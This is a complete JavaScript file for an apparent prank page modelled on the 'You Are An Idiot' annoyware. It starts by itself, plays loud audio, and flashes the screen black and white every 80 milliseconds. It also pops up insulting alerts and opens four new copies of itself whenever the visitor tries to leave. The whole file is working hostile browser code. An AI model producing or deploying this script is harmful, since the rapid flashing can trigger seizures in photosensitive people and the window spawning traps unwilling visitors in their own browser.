const audio = document.getElementById('sound');
let windows = [];

function startPrank() {
    audio.volume = 1.0;
    audio.play();

    // Super fast flashing
    setInterval(() => {
        document.body.style.backgroundColor = Math.random() > 0.5 ? '#000' : '#fff';
    }, 80);

    // Spawn fake alerts
    setInterval(() => {
        if (Math.random() > 0.5) {
            alert("YOU ARE AN IDIOT! ☺ ☺ ☺");
        }
    }, 900);

    // Spawn more windows when trying to leave
    window.onbeforeunload = () => {
        for (let i = 0; i < 4; i++) {
            const newWin = window.open(window.location.href, '_blank', 'width=600,height=400');
            if (newWin) windows.push(newWin);
        }
        return "YOU ARE AN IDIOT!";
    };
}

// Auto start
setTimeout(() => {
    startPrank();
}, 600);

// Click makes it worse
document.addEventListener('click', () => {
    audio.currentTime = 0;
    audio.play();
    alert("YOU ARE AN IDIOT! ☺");
});
